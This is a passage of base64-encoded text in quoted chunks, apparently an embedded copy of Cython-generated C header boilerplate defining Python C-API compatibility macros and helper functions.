gICAgICAgKCh2b2lkKil1KQogICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX1JFQUQoaywgZCwgaSkgICAoKHZvaWQpaywgUHlVbmljb2RlX1JlYWRDaGFyKChQeU9iamVjdCopKGQpLCBpKSkKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9JU19UUlVFKHUpICAgICAgKDAgIT0gUHlVbmljb2RlX0dldExlbmd0aCh1KSkKI2Vsc2UKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMAogICAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfUkVBRFkob3ApICAgICAgICgwKQogICNlbHNlCiAgICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9SRUFEWShvcCkgICAgICAgKGxpa2VseShQeVVuaWNvZGVfSVNfUkVBRFkob3ApKSA/XAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAwIDogX1B5VW5pY29kZV9SZWFkeSgoUHlPYmplY3QgKikob3ApKSkKICAjZW5kaWYKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9SRUFEX0NIQVIodSwgaSkgUHlVbmljb2RlX1JFQURfQ0hBUih1LCBpKQogICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKHUpICAgUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKHUpCiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfS0lORCh1KSAgICAgICAgICgoaW50KVB5VW5pY29kZV9LSU5EKHUpKQogICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0RBVEEodSkgICAgICAgICBQeVVuaWNvZGVfREFUQSh1KQogICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX1JFQUQoaywgZCwgaSkgICBQeVVuaWNvZGVfUkVBRChrLCBkLCBpKQogICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX1dSSVRFKGssIGQsIGksIGNoKSAgUHlVbmljb2RlX1dSSVRFKGssIGQsIGksIChQeV9VQ1M0KSBjaCkKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMAogICAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfSVNfVFJVRSh1KSAgICAgICgwICE9IFB5VW5pY29kZV9HRVRfTEVOR1RIKHUp""KQogICNlbHNlCiAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAKICAgICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0lTX1RSVUUodSkgICAgICAoMCAhPSAobGlrZWx5KFB5VW5pY29kZV9JU19SRUFEWSh1KSkgPyBQeVVuaWNvZGVfR0VUX0xFTkdUSCh1KSA6ICgoUHlDb21wYWN0VW5pY29kZU9iamVjdCAqKSh1KSktPndzdHJfbGVuZ3RoKSkKICAgICNlbHNlCiAgICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9JU19UUlVFKHUpICAgICAgKDAgIT0gKGxpa2VseShQeVVuaWNvZGVfSVNfUkVBRFkodSkpID8gUHlVbmljb2RlX0dFVF9MRU5HVEgodSkgOiBQeVVuaWNvZGVfR0VUX1NJWkUodSkpKQogICAgI2VuZGlmCiAgI2VuZGlmCiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0KGEsIGIpICAgICAgUHlOdW1iZXJfQWRkKGEsIGIpCiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0U2FmZShhLCBiKSAgUHlOdW1iZXJfQWRkKGEsIGIpCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0KGEsIGIpICAgICAgUHlVbmljb2RlX0NvbmNhdChhLCBiKQogICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdFNhZmUoYSwgYikgICgodW5saWtlbHkoKGEpID09IFB5X05vbmUpIHx8IHVubGlrZWx5KChiKSA9PSBQeV9Ob25lKSkgP1wKICAgICAgUHlOdW1iZXJfQWRkKGEsIGIpIDogX19QeXhfUHlVbmljb2RlX0NvbmNhdChhLCBiKSkKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkKICAjaWYgIWRlZmluZWQoUHlVbmljb2RlX0RlY29kZVVuaWNvZGVFc2NhcGUpCiAgICAjZGVmaW5lIFB5VW5pY29kZV9EZWNvZGVVbmljb2RlRXNjYXBlKHMsIHNpemUsIGVycm9ycykgIFB5VW5pY29kZV9EZWNvZGUocywgc2l6ZSwgInVuaWNvZGVfZXNjYXBlIiwgZXJyb3JzKQogICNlbmRpZgogICNpZiAhZGVmaW5lZChQeVVuaWNvZGVfQ29udGFpbnMpCiAgICAjZGVmaW5lIFB5VW5pY29kZV9Db250YWlucyh1LCBzKSAgUHlTZXF1ZW5jZV9Db250YWlucyh1LCBzKQogICNlbmRpZgogICNpZiAhZGVmaW5lZChQeUJ5dGVBcnJheV9DaGVjaykKICAgICNkZWZpbmUgUHlCeXRlQXJyYXlfQ2hlY2sob2JqKSAgUHlPYmplY3RfVHlwZUNoZWNrKG9iaiwgJlB5Qnl0ZUFycmF5X1R5cGUpCiAgI2VuZGlmCiAgI2lmICFkZWZpbmVkKFB5T2JqZWN0X0Zvcm1hdCkKICAgICNkZWZpbmUgUHlPYmplY3RfRm9ybWF0KG9iaiwgZm10KSAgUHlPYmplY3RfQ2FsbE1ldGhvZChvYmosICJfX2Zvcm1hdF9fIiwgIk8iLCBmbXQpCiAgI2VuZGlmCiNlbmRpZgojZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gb3JtYXRTYWZlKGEsIGIpICAoKHVubGlrZWx5KChhKSA9PSBQeV9Ob25lIHx8IChQeVVuaWNvZGVfQ2hlY2soYikgJiYgIVB5VW5pY29kZV9DaGVja0V4YWN0KGIpKSkpID8gUHlOdW1iZXJfUmVtYWlu""ZGVyKGEsIGIpIDogUHlVbmljb2RlX0Zvcm1hdChhLCBiKSkKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9MaXN0S2VlcE5ldyhvYmopXAogICAgKGxpa2VseShQeUxpc3RfQ2hlY2tFeGFjdChvYmopICYmIFB5X1JFRkNOVChvYmopID09IDEpID8gX19QeXhfTmV3UmVmKG9iaikgOiBQeVNlcXVlbmNlX0xpc3Qob2JqKSkKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5U2VxdWVuY2VfTGlzdEtlZXBOZXcob2JqKSAgUHlTZXF1ZW5jZV9MaXN0KG9iaikKI2VuZGlmCiNpZm5kZWYgUHlTZXRfQ2hlY2tFeGFjdAogICNkZWZpbmUgUHlTZXRfQ2hlY2tFeGFjdChvYmopICAgICAgICBfX1B5eF9JU19UWVBFKG9iaiwgJlB5U2V0X1R5cGUpCiNlbmRpZgojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDBBNAogICNkZWZpbmUgX19QeXhfU0VUX1JFRkNOVChvYmosIHJlZmNudCkgUHlfU0VUX1JFRkNOVChvYmosIHJlZmNudCkKICAjZGVmaW5lIF9fUHl4X1NFVF9TSVpFKG9iaiwgc2l6ZSkgUHlfU0VUX1NJWkUob2JqLCBzaXplKQojZWxzZQogICNkZWZpbmUgX19QeXhfU0VUX1JFRkNOVChvYmosIHJlZmNudCkgUHlfUkVGQ05UKG9iaikgPSAocmVmY250KQogICNkZWZpbmUgX19QeXhfU0VUX1NJWkUob2JqLCBzaXplKSBQeV9TSVpFKG9iaikgPSAoc2l6ZSkKI2VuZGlmCiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyB8fCBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTCiAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICAgI2RlZmluZSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihvLCBpKSBQeUxpc3RfR2V0SXRlbVJlZihvLCBpKQogICNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICNkZWZpbmUgX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgaSkgKGxpa2VseSgoaSkgPj0gMCkgPyBQeVNlcXVlbmNlX0dldEl0ZW0obywgaSkgOiAoUHlFcnJfU2V0U3RyaW5nKFB5RXhjX0luZGV4RXJyb3IsICJsaXN0IGluZGV4IG91dCBvZiByYW5nZSIpLCAoUHlPYmplY3QqKU5VTEwpKQogICNlbHNlCiAgICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKG8sIGkpIFB5U2VxdWVuY2VfSVRFTShvLCBpKQogICNlbmRpZgojZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8ICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICAgI2RlZmluZSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihvLCBpKSBQeUxpc3RfR2V0SXRlbVJlZihvLCBpKQogICNlbHNlCiAgICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKG8sIGkpIF9fUHl4X1hOZXdSZWYoUHlMaXN0X0dldEl0ZW0obywgaSkpCiAgI2VuZGlmCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9Q""eUxpc3RfR2V0SXRlbVJlZihvLCBpKSBfX1B5eF9OZXdSZWYoUHlMaXN0X0dFVF9JVEVNKG8sIGkpKQojZW5kaWYKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAojZGVmaW5lIF9fUHl4X1B5RGljdF9HZXRJdGVtUmVmKGRpY3QsIGtleSwgcmVzdWx0KSBQeURpY3RfR2V0SXRlbVJlZihkaWN0LCBrZXksIHJlc3VsdCkKI2VsaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgfHwgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUwpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoUHlPYmplY3QgKmRpY3QsIFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICoqcmVzdWx0KSB7CiAgKnJlc3VsdCA9IFB5T2JqZWN0X0dldEl0ZW0oZGljdCwga2V5KTsKICBpZiAoKnJlc3VsdCA9PSBOVUxMKSB7CiAgICBpZiAoUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhQeUV4Y19LZXlFcnJvcikpIHsKICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgICAgcmV0dXJuIDA7CiAgICB9CiAgICByZXR1cm4gLTE7CiAgfQogIHJldHVybiAxOwp9CiNlbHNlCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeURpY3RfR2V0SXRlbVJlZihQeU9iamVjdCAqZGljdCwgUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKipyZXN1bHQpIHsKICAqcmVzdWx0ID0gUHlEaWN0X0dldEl0ZW1XaXRoRXJyb3IoZGljdCwga2V5KTsKICBpZiAoKnJlc3VsdCA9PSBOVUxMKSB7CiAgICByZXR1cm4gUHlFcnJfT2NjdXJyZWQoKSA/IC0xIDogMDsKICB9CiAgUHlfSU5DUkVGKCpyZXN1bHQpOwogIHJldHVybiAxOwp9CiNlbmRpZgojaWYgZGVmaW5lZChDWVRIT05fREVCVUdfVklTSVRfQ09OU1QpICYmIENZVEhPTl9ERUJVR19WSVNJVF9DT05TVAogICNkZWZpbmUgX19QeXhfVklTSVRfQ09OU1Qob2JqKSAgUHlfVklTSVQob2JqKQojZWxzZQogICNkZWZpbmUgX19QeXhfVklTSVRfQ09OU1Qob2JqKQojZW5kaWYKI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAjZGVmaW5lIF9fUHl4X1B5U2VxdWVuY2VfSVRFTShvLCBpKSBQeVNlcXVlbmNlX0lURU0obywgaSkKICAjZGVmaW5lIF9fUHl4X1B5U2VxdWVuY2VfU0laRShzZXEpICBQeV9TSVpFKHNlcSkKICAjZGVmaW5lIF9fUHl4X1B5VHVwbGVfU0VUX0lURU0obywgaSwgdikgKFB5VHVwbGVfU0VUX0lURU0obywgaSwgdiksICgwKSkKICAjZGVmaW5lIF9fUHl4X1B5VHVwbGVfR0VUX0lURU0obywgaSkgUHlUdXBsZV9HRVRfSVRFTShvLCBpKQogICNkZWZpbmUgX19QeXhfUHlMaXN0X1NFVF9JVEVNKG8sIGksIHYpIChQeUxpc3RfU0VUX0lURU0obywgaSwgdiksICgwKSkKICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HRVRfSVRFTShvLCBpKSBQeUxpc3RfR0VUX0lURU0obywgaSkKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5U2VxdWVuY2VfSVRFTShvLCBpKSBQeVNlcXVlbmNlX0dldEl0ZW0obywgaSkKICAjZGVmaW5lIF9fUHl4X1B5U2VxdWVuY2Vf""U0laRShzZXEpICBQeVNlcXVlbmNlX1NpemUoc2VxKQogICNkZWZpbmUgX19QeXhfUHlUdXBsZV9TRVRfSVRFTShvLCBpLCB2KSBQeVR1cGxlX1NldEl0ZW0obywgaSwgdikKICAjZGVmaW5lIF9fUHl4X1B5VHVwbGVfR0VUX0lURU0obywgaSkgUHlUdXBsZV9HZXRJdGVtKG8sIGkpCiAgI2RlZmluZSBfX1B5eF9QeUxpc3RfU0VUX0lURU0obywgaSwgdikgUHlMaXN0X1NldEl0ZW0obywgaSwgdikKICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HRVRfSVRFTShvLCBpKSBQeUxpc3RfR2V0SXRlbShvLCBpKQojZW5kaWYKI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgI2RlZmluZSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKG8pIFB5VHVwbGVfR0VUX1NJWkUobykKICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HRVRfU0laRShvKSBQeUxpc3RfR0VUX1NJWkUobykKICAjZGVmaW5lIF9fUHl4X1B5U2V0X0dFVF9TSVpFKG8pIFB5U2V0X0dFVF9TSVpFKG8pCiAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0dFVF9TSVpFKG8pIFB5Qnl0ZXNfR0VUX1NJWkUobykKICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZUFycmF5X0dFVF9TSVpFKG8pIFB5Qnl0ZUFycmF5X0dFVF9TSVpFKG8pCiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChvKSBQeVVuaWNvZGVfR0VUX0xFTkdUSChvKQojZWxzZQogICNkZWZpbmUgX19QeXhfUHlUdXBsZV9HRVRfU0laRShvKSBQeVR1cGxlX1NpemUobykKICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HRVRfU0laRShvKSBQeUxpc3RfU2l6ZShvKQogICNkZWZpbmUgX19QeXhfUHlTZXRfR0VUX1NJWkUobykgUHlTZXRfU2l6ZShvKQogICNkZWZpbmUgX19QeXhfUHlCeXRlc19HRVRfU0laRShvKSBQeUJ5dGVzX1NpemUobykKICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZUFycmF5X0dFVF9TSVpFKG8pIFB5Qnl0ZUFycmF5X1NpemUobykKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKG8pIFB5VW5pY29kZV9HZXRMZW5ndGgobykKI2VuZGlmCiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAKICAjZGVmaW5lIF9fUHl4X1B5SW1wb3J0X0FkZE1vZHVsZVJlZihuYW1lKSBQeUltcG9ydF9BZGRNb2R1bGVSZWYobmFtZSkKI2Vsc2UKICBzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKGNvbnN0IGNoYXIgKm5hbWUpIHsKICAgICAgUHlPYmplY3QgKm1vZHVsZSA9IFB5SW1wb3J0X0FkZE1vZHVsZShuYW1lKTsKICAgICAgUHlfWElOQ1JFRihtb2R1bGUpOwogICAgICByZXR1cm4gbW9kdWxlOwogIH0KI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgIWRlZmluZWQoUHlVbmljb2RlX0ludGVybkZyb21TdHJpbmcpCiAgI2RlZmluZSBQeVVuaWNvZGVfSW50ZXJuRnJvbVN0cmluZyhzKSBQeVVuaWNvZGVfRnJvbVN0cmluZyhzKQojZW5kaWYKI2RlZmluZSBfX1B5eF9QeUxvbmdfRnJvbUhhc2hfdCBQeUxvbmdfRnJvbVNz""aXplX3QKI2RlZmluZSBfX1B5eF9QeUxvbmdfQXNIYXNoX3QgICBfX1B5eF9QeUluZGV4X0FzU3NpemVfdAojaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwCiAgICAjZGVmaW5lIF9fUHl4X1B5U2VuZFJlc3VsdCBQeVNlbmRSZXN1bHQKI2Vsc2UKICAgIHR5cGVkZWYgZW51bSB7CiAgICAgICAgUFlHRU5fUkVUVVJOID0gMCwKICAgICAgICBQWUdFTl9FUlJPUiA9IC0xLAogICAgICAgIFBZR0VOX05FWFQgPSAxLAogICAgfSBfX1B5eF9QeVNlbmRSZXN1bHQ7CiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwQTMKICB0eXBlZGVmIF9fUHl4X1B5U2VuZFJlc3VsdCAoKl9fUHl4X3B5aXRlcl9zZW5kZnVuYykoUHlPYmplY3QgKml0ZXIsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKipyZXN1bHQpOwojZWxzZQogICNkZWZpbmUgX19QeXhfcHlpdGVyX3NlbmRmdW5jIHNlbmRmdW5jCiNlbmRpZgojaWYgIUNZVEhPTl9VU0VfQU1fU0VORAojZGVmaW5lIF9fUFlYX0hBU19QWV9BTV9TRU5EIDAKI2VsaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwCiNkZWZpbmUgX19QWVhfSEFTX1BZX0FNX1NFTkQgMQojZWxzZQojZGVmaW5lIF9fUFlYX0hBU19QWV9BTV9TRU5EIDIgIC8vIG91ciBvd24gYmFja3BvcnRlZCBpbXBsZW1lbnRhdGlvbgojZW5kaWYKI2lmIF9fUFlYX0hBU19QWV9BTV9TRU5EIDwgMgogICAgI2RlZmluZSBfX1B5eF9QeUFzeW5jTWV0aG9kc1N0cnVjdCBQeUFzeW5jTWV0aG9kcwojZWxzZQogICAgdHlwZWRlZiBzdHJ1Y3QgewogICAgICAgIHVuYXJ5ZnVuYyBhbV9hd2FpdDsKICAgICAgICB1bmFyeWZ1bmMgYW1fYWl0ZXI7CiAgICAgICAgdW5hcnlmdW5jIGFtX2FuZXh0OwogICAgICAgIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyBhbV9zZW5kOwogICAgfSBfX1B5eF9QeUFzeW5jTWV0aG9kc1N0cnVjdDsKICAgICNkZWZpbmUgX19QeXhfU2xvdFRwQXNBc3luYyhzKSAoKFB5QXN5bmNNZXRob2RzKikocykpCiNlbmRpZgojaWYgQ1lUSE9OX1VTRV9BTV9TRU5EICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDBGMAogICAgI2RlZmluZSBfX1B5eF9UUEZMQUdTX0hBVkVfQU1fU0VORCAoMVVMIDw8IDIxKQojZWxzZQogICAgI2RlZmluZSBfX1B5eF9UUEZMQUdTX0hBVkVfQU1fU0VORCAoMCkKI2VuZGlmCiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwCiNkZWZpbmUgX19QeXhfUHlJbnRlcnByZXRlclN0YXRlX0dldCgpIFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXQoKQojZWxzZQojZGVmaW5lIF9fUHl4X1B5SW50ZXJwcmV0ZXJTdGF0ZV9HZXQoKSBQeVRocmVhZFN0YXRlX0dldCgpLT5pbnRlcnAKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMAojaWZkZWYgX19jcGx1c3BsdXMKZXh0ZXJuICJDIgojZW5kaWYK""UHlBUElfRlVOQyh2b2lkICopIFB5TWVtX0NhbGxvYyhzaXplX3QgbmVsZW0sIHNpemVfdCBlbHNpemUpOwojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKc3RhdGljIGludCBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKFB5T2JqZWN0ICppbnNwZWN0LCBjb25zdCBjaGFyKiBuYW1lLCBpbnQgKndyaXRlX3RvKSB7CiAgICBpbnQgdmFsdWU7CiAgICBQeU9iamVjdCAqcHlfdmFsdWUgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKGluc3BlY3QsIG5hbWUpOwogICAgaWYgKCFweV92YWx1ZSkgcmV0dXJuIDA7CiAgICB2YWx1ZSA9IChpbnQpIFB5TG9uZ19Bc0xvbmcocHlfdmFsdWUpOwogICAgUHlfREVDUkVGKHB5X3ZhbHVlKTsKICAgICp3cml0ZV90byA9IHZhbHVlOwogICAgcmV0dXJuIHZhbHVlICE9IC0xIHx8ICFQeUVycl9PY2N1cnJlZCgpOwp9CnN0YXRpYyBpbnQgX19QeXhfaW5pdF9jb192YXJpYWJsZXModm9pZCkgewogICAgUHlPYmplY3QgKmluc3BlY3Q7CiAgICBpbnQgcmVzdWx0OwogICAgaW5zcGVjdCA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZSgiaW5zcGVjdCIpOwogICAgcmVzdWx0ID0KI2lmICFkZWZpbmVkKENPX09QVElNSVpFRCkKICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19PUFRJTUlaRUQiLCAmQ09fT1BUSU1JWkVEKSAmJgojZW5kaWYKI2lmICFkZWZpbmVkKENPX05FV0xPQ0FMUykKICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19ORVdMT0NBTFMiLCAmQ09fTkVXTE9DQUxTKSAmJgojZW5kaWYKI2lmICFkZWZpbmVkKENPX1ZBUkFSR1MpCiAgICAgICAgX19QeXhfaW5pdF9jb192YXJpYWJsZShpbnNwZWN0LCAiQ09fVkFSQVJHUyIsICZDT19WQVJBUkdTKSAmJgojZW5kaWYKI2lmICFkZWZpbmVkKENPX1ZBUktFWVdPUkRTKQogICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX1ZBUktFWVdPUkRTIiwgJkNPX1ZBUktFWVdPUkRTKSAmJgojZW5kaWYKI2lmICFkZWZpbmVkKENPX0FTWU5DX0dFTkVSQVRPUikKICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19BU1lOQ19HRU5FUkFUT1IiLCAmQ09fQVNZTkNfR0VORVJBVE9SKSAmJgojZW5kaWYKI2lmICFkZWZpbmVkKENPX0dFTkVSQVRPUikKICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19HRU5FUkFUT1IiLCAmQ09fR0VORVJBVE9SKSAmJgojZW5kaWYKI2lmICFkZWZpbmVkKENPX0NPUk9VVElORSkKICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19DT1JPVVRJTkUiLCAmQ09fQ09ST1VUSU5FKSAmJgojZW5kaWYKICAgICAgICAxOwogICAgUHlfREVDUkVGKGluc3BlY3QpOwogICAgcmV0dXJuIHJlc3VsdCA/IDAgOiAtMTsKfQojZWxzZQpzdGF0aWMgaW50IF9fUHl4X2luaXRfY29fdmFyaWFibGVzKHZvaWQpIHsKICAgIHJldHVybiAwOyAgLy8gSXQncyBhIGxpbWl0""ZWQgQVBJLW9ubHkgZmVhdHVyZQp9CiNlbmRpZgoKCiNpZiBkZWZpbmVkKF9XSU4zMikgfHwgZGVmaW5lZChXSU4zMikgfHwgZGVmaW5lZChNU19XSU5ET1dTKQogICNpZm5kZWYgX1VTRV9NQVRIX0RFRklORVMKICAgICNkZWZpbmUgX1VTRV9NQVRIX0RFRklORVMKICAjZW5kaWYKI2VuZGlmCiNpbmNsdWRlIDxtYXRoLmg+CiNpZmRlZiBOQU4KI2RlZmluZSBfX1BZWF9OQU4oKSAoKGZsb2F0KSBOQU4pCiNlbHNlCnN0YXRpYyBDWVRIT05fSU5MSU5FIGZsb2F0IF9fUFlYX05BTigpIHsKICBmbG9hdCB2YWx1ZTsKICBtZW1zZXQoJnZhbHVlLCAweEZGLCBzaXplb2YodmFsdWUpKTsKICByZXR1cm4gdmFsdWU7Cn0KI2VuZGlmCiNpZiBkZWZpbmVkKF9fQ1lHV0lOX18pICYmIGRlZmluZWQoX0xEQkxfRVFfREJMKQojZGVmaW5lIF9fUHl4X3RydW5jbCB0cnVuYwojZWxzZQojZGVmaW5lIF9fUHl4X3RydW5jbCB0cnVuY2wKI2VuZGlmCgojaWZuZGVmIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0tfUlVOVElNRQojZGVmaW5lIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0tfUlVOVElNRSAwCiNlbmRpZgojaWZuZGVmIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0sKI2RlZmluZSBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0tfUlVOVElNRQojZW5kaWYKI2lmIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0sKI2RlZmluZSBfX1BZWF9NQVJLX0VSUl9QT1MoZl9pbmRleCwgbGluZW5vKSAgeyBfX3B5eF9maWxlbmFtZSA9IF9fcHl4X2ZbZl9pbmRleF07ICh2b2lkKSBfX3B5eF9maWxlbmFtZTsgX19weXhfbGluZW5vID0gbGluZW5vOyAodm9pZCkgX19weXhfbGluZW5vOyBfX3B5eF9jbGluZW5vID0gX19MSU5FX187ICh2b2lkKSBfX3B5eF9jbGluZW5vOyB9CiNlbHNlCiNkZWZpbmUgX19QWVhfTUFSS19FUlJfUE9TKGZfaW5kZXgsIGxpbmVubykgIHsgX19weXhfZmlsZW5hbWUgPSBfX3B5eF9mW2ZfaW5kZXhdOyAodm9pZCkgX19weXhfZmlsZW5hbWU7IF9fcHl4X2xpbmVubyA9IGxpbmVubzsgKHZvaWQpIF9fcHl4X2xpbmVubzsgKHZvaWQpIF9fcHl4X2NsaW5lbm87IH0KI2VuZGlmCiNkZWZpbmUgX19QWVhfRVJSKGZfaW5kZXgsIGxpbmVubywgTG5fZXJyb3IpIFwKICAgIHsgX19QWVhfTUFSS19FUlJfUE9TKGZfaW5kZXgsIGxpbmVubykgZ290byBMbl9lcnJvcjsgfQoKI2lmZGVmIENZVEhPTl9FWFRFUk5fQwogICAgI3VuZGVmIF9fUFlYX0VYVEVSTl9DCiAgICAjZGVmaW5lIF9fUFlYX0VYVEVSTl9DIENZVEhPTl9FWFRFUk5fQwojZWxpZiBkZWZpbmVkKF9fUFlYX0VYVEVSTl9DKQogICAgI2lmZGVmIF9NU0NfVkVSCiAgICAjcHJhZ21hIG1lc3NhZ2UgKCJQbGVhc2UgZG8gbm90IGRlZmluZSB0aGUgJ19fUFlYX0VYVEVSTl9DJyBtYWNybyBleHRlcm5hbGx5LiBVc2UgJ0NZVEhPTl9FWFRFUk5fQycgaW5zdGVhZC4iKQogICAgI2Vsc2UKICAgICN3YXJuaW5nIFBsZWFzZSBkbyBub3QgZGVmaW5lIHRo""ZSAnX19QWVhfRVhURVJOX0MnIG1hY3JvIGV4dGVybmFsbHkuIFVzZSAnQ1lUSE9OX0VYVEVSTl9DJyBpbnN0ZWFkLgogICAgI2VuZGlmCiNlbHNlCiAgI2lmZGVmIF9fY3BsdXNwbHVzCiAgICAjZGVmaW5lIF9fUFlYX0VYVEVSTl9DIGV4dGVybiAiQyIKICAjZWxzZQogICAgI2RlZmluZSBfX1BZWF9FWFRFUk5fQyBleHRlcm4KICAjZW5kaWYKI2VuZGlmCgojZGVmaW5lIF9fUFlYX0hBVkVfX2dhCiNkZWZpbmUgX19QWVhfSEFWRV9BUElfX2dhCgojaWZkZWYgX09QRU5NUAojaW5jbHVkZSA8b21wLmg+CiNlbmRpZiAKCiNpZiBkZWZpbmVkKFBZUkVYX1dJVEhPVVRfQVNTRVJUSU9OUykgJiYgIWRlZmluZWQoQ1lUSE9OX1dJVEhPVVRfQVNTRVJUSU9OUykKI2RlZmluZSBDWVRIT05fV0lUSE9VVF9BU1NFUlRJT05TCiNlbmRpZgoKI2RlZmluZSBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19BU0NJSSAw